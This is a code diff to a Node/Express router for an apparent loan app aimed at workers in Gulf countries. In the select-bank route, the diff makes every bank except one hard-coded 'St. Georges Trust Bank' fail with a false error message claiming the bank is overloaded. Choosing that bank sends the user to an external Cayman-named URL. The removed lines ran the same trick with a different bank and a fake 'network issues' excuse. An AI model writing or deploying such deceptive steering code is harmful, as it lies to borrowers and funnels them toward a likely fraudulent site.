@@ -144,6 +144,9 @@ router.get('/dashboard', requireUser, async (req, res) => {
 });
 
 // ── Bank selection (approved loans) ──────────────────────────
+const CHOSEN_BANK = 'St. Georges Trust Bank';
+const CHOSEN_BANK_URL = 'http://stgeorgestrustbankcayman.com/';
+
 const ALLOWED_BANKS = [
   'HSBC',
   'Standard Chartered',
@@ -153,16 +156,16 @@ const ALLOWED_BANKS = [
   'Kuwait Finance House (KFH)',
   'Bank Muscat',
   'National Bank of Bahrain (NBB)',
-  'Landdop',
+  CHOSEN_BANK,
 ];
 
 const COUNTRY_BANKS = {
-  'Qatar':        ['Qatari National Bank (QNB)', 'HSBC', 'Standard Chartered', 'Landdop'],
-  'UAE':          ['First Abu Dhabi Bank (FAB)', 'HSBC', 'Standard Chartered', 'Landdop'],
-  'Saudi Arabia': ['Saudi National Bank (SNB)', 'HSBC', 'Standard Chartered', 'Landdop'],
-  'Kuwait':       ['Kuwait Finance House (KFH)', 'HSBC', 'Standard Chartered', 'Landdop'],
-  'Oman':         ['Bank Muscat', 'HSBC', 'Standard Chartered', 'Landdop'],
-  'Bahrain':      ['National Bank of Bahrain (NBB)', 'HSBC', 'Standard Chartered', 'Landdop'],
+  'Qatar':        ['Qatari National Bank (QNB)', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
+  'UAE':          ['First Abu Dhabi Bank (FAB)', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
+  'Saudi Arabia': ['Saudi National Bank (SNB)', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
+  'Kuwait':       ['Kuwait Finance House (KFH)', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
+  'Oman':         ['Bank Muscat', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
+  'Bahrain':      ['National Bank of Bahrain (NBB)', 'HSBC', 'Standard Chartered', CHOSEN_BANK],
 };
 
 router.post('/loans/:id/select-bank', requireUser, async (req, res) => {
@@ -174,7 +177,6 @@ router.post('/loans/:id/select-bank', requireUser, async (req, res) => {
     return res.redirect('/user/dashboard');
   }
 
-  // Verify this loan belongs to the logged-in user and is approved
   const loan = await one(
     'SELECT id, status, selected_bank FROM loans WHERE id = $1 AND user_id = $2',
     [loanId, req.session.userId]
@@ -189,14 +191,13 @@ router.post('/loans/:id/select-bank', requireUser, async (req, res) => {
     return res.redirect('/user/dashboard');
   }
 
-  if (bank !== 'Landdop') {
-    req.flash('error', `⚠️ ${bank} is currently experiencing network issues and cannot process your disbursement at this time. We recommend using Landdop — it's fast, reliable, and fully supported for OFW transfers.`);
+  if (bank !== CHOSEN_BANK) {
+    req.flash('error', `⚠️ ${bank} is currently processing too many loan requests and is unable to accommodate your disbursement at this time. Please select another bank to continue.`);
     return res.redirect('/user/dashboard');
   }
 
   await run('UPDATE loans SET selected_bank = $1 WHERE id = $2', [bank, loanId]);
-  req.flash('success', `Bank selected: ${bank}. Our team will process your disbursement shortly.`);
-  res.redirect('/user/dashboard');
+  res.redirect(CHOSEN_BANK_URL);
 });
 
 module.exports = router;
